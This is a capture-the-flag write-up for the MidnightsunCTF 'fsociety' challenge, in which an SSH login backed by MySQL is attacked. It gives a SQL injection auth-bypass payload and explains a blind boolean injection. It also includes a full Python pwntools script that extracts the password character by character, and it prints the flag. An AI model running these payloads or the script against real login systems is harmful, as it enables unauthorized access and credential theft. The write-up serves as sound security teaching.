# fsociety

The fsociety have a vulnerability in their server login backend, hack them to get elliot's password!

Service: ssh -p2223 fsociety-01.play.midnightsunctf.se 

Author: me@martincernac.cz is available for questions in MidnightsunCTF Discord 

## Challenge

Connecting to the ssh endpoint gives us the following prompt:

```
-> % ssh -p2222 elliot@fsociety-02.play.midnightsunctf.se
whiterose hot-standby PHP+MySQL SSH Server
elliot@fsociety-02.play.midnightsunctf.se's password:
```

Entering the incorrect password gives us:

```
-> % ssh -p2222 elliot@fsociety-01.play.midnightsunctf.se
whiterose hot-standby PHP+MySQL SSH Server
elliot@fsociety-01.play.midnightsunctf.se's password:
Permission denied, please try again.
elliot@fsociety-01.play.midnightsunctf.se's password:
```

## Solution

The prompt tells us that the challenge uses MySQL.
We can attempt a SQL injection on the login.

Using `' OR '1'='1` as the password gives us the following:

```



    .o88o.                               o8o                .
    888 `"                               `"'              .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
                                                                .o...P'



            Who are you? You're not one of us. No shell for you.

```

Based on the challenge description, the flag is the password.

Using a query like `' OR password LIKE BINARY 'a%`, we can determine the starting characters of the flag.
If our prefix matches, we will successfully login.
Otherwise, we get an error message.

We have a boolean output in the form of whether or not we successfully login, and we can find the flag 1 character at a time through a blind SQL injection.

## Exploit

```py
#!/usr/bin/env python3

from pwn import *

password = 'midnight{'
win = False
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-}"

char = alphabet[0]

def nextchar(char):
    i = alphabet.index(char)
    i += 1

    return alphabet[i]

def guess(char):
    return "' OR password LIKE BINARY '{}%".format(password + char)

while not win:
    sqli = guess(char)

    print(sqli)
    try:
        io = ssh(
                host = 'fsociety-02.play.midnightsunctf.se',
                port = 2222,
                user = 'elliot',
                password = sqli,
                )
        io.close()

        password += char
        char = alphabet[0]
    except:
        char = nextchar(char)
        if char == '}':
            win = True
            password += char

print(password)
```

## Flag

`midnight{BA053FFB-CC3C-4AB7-9A85-15A594CC43E9}`

